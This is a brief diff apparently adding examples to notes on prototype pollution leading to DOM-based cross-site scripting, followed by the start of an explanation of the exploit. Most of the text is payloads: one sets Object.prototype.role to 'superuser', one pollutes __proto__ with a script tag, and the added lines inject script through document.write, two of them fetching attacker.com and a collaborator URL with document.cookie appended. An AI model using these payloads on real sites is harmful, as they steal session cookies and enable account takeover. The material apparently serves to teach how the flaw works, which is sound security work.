@@ -30,6 +30,18 @@ Object.prototype.role = "superuser";
 { "__proto__": { "XSS": "<script>alert('silent')</script>" } }
 
 
+Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
+document.write({}.innerHTML);
+
+
+Object.prototype.innerHTML = '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>';  
+document.write({}.innerHTML);
+
+
+Object.prototype.innerHTML = '<script>fetch("https://your-collaborator-url.com/?cookie=" + document.cookie)</script>';
+document.write({}.innerHTML);
+
+
 Yes, this image shows a DOM-based XSS (Cross-Site Scripting) vulnerability triggered via Prototype Pollution.
 
 Breakdown of the Exploit:
